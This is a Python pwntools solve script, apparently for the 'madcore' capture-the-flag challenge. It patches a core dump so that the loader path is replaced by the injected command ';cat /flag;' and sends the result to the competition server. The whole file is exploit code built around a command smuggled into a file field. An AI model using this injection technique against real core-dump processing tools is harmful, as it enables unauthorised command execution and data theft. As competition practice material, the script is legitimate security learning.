from pwn import *

# p = process('./madcore')
p = remote('madcore.2022.ctfcompetition.com', 1337)

to_replace = b'/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'

cmd = b';cat /flag;'
cmd = cmd.ljust(len(to_replace), b'a')

with open('./coredump/core_test_6040', 'rb') as f:
    core_dump = f.read()
    core_patched = core_dump.replace(to_replace, cmd)

payload = core_patched
payload = payload.ljust(0x1000000, b'\x00')

p.sendline(payload)
p.recvuntil(b'FINISHED READING.\n')

p.interactive()
